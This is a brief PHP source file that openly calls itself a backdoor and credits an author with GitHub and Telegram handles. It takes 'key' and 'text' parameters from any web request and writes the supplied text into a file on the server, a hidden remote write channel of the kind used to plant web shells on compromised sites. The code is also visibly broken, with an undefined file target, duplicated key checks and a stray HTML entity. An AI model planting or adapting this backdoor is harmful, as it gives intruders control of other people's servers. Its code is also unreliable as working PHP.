<?php

/*

- Backdoor File coded by @Subn3t
- Version: 1.0.4
- GitHub: https://github.com/gdsubn3t/Backdoor/
- Telegram: @subn3t
- You can use this code, but please give credits.
- Have fun and stay legal!


*/
$key;
$text;
if (isset($_REQUEST['key'])){
	$key = $_REQUEST['key'];

}
if (isset($_REQUEST['text'])) {
	$text = $_REQUEST['text'];
}

if ($key == '') {
	file_put_contents(file, '$%&amp;'.$text);
}
if ($key == '') {
	file_put_contents(file, $text);
}

?>
